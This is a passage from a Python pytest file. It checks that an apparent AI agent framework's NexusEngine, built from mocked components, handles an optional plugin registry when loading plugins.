        engine = NexusEngine(
            persona_manager=MagicMock(),
            anomaly_engine=MagicMock(),
            notary=MagicMock(),
            ledger=MagicMock(),
            chain_manager=MagicMock(),
            context_builder=MagicMock(),
            tool_registry=MagicMock(),
            tool_selector=MagicMock(),
            tool_executor=MagicMock(),
            output_validator=MagicMock(),
            cot_logger=MagicMock(),
            think_act_gate=MagicMock(),
            continue_complete_gate=MagicMock(),
            escalate_gate=MagicMock(),
            plugin_registry=None,
        )
        assert engine.plugin_registry is None

    @pytest.mark.asyncio
    async def test_load_plugins_calls_load_state(self):
        from nexus.core.engine import NexusEngine
        from unittest.mock import MagicMock, AsyncMock

        mock_plugin_registry = MagicMock()
        mock_plugin_registry.load_state = AsyncMock()

        engine = NexusEngine(
            persona_manager=MagicMock(),
            anomaly_engine=MagicMock(),
            notary=MagicMock(),
            ledger=MagicMock(),
            chain_manager=MagicMock(),
            context_builder=MagicMock(),
            tool_registry=MagicMock(),
            tool_selector=MagicMock(),
            tool_executor=MagicMock(),
            output_validator=MagicMock(),
            cot_logger=MagicMock(),
            think_act_gate=MagicMock(),
            continue_complete_gate=MagicMock(),
            escalate_gate=MagicMock(),
            plugin_registry=mock_plugin_registry,
        )
        await engine.load_plugins()
        mock_plugin_registry.load_state.assert_awaited_once()

    @pytest.mark.asyncio
    async def test_load_plugins_noop_without_registry(self):
        from nexus.core.engine import NexusEngine
        from unittest.mock import MagicMock

        engine = NexusEngine(
            persona_manager=MagicMock(),
            anomaly_engine=MagicMock(),
            notary=MagicMock(),
            ledger=MagicMock(),
            chain_manager=MagicMock(),
            context_builder=MagicMock(),
            tool_registry=MagicMock(),
            tool_selector=MagicMock(),
            tool_executor=MagicMock(),
            output_validator=MagicMock(),
            cot_logger=MagicMock(),
            think_act_gate=MagicMock(),
            continue_complete_gate=MagicMock(),
            escalate_gate=MagicMock(),
            plugin_registry=None,
        )
        # Should not raise
        await engine.load_plugins()
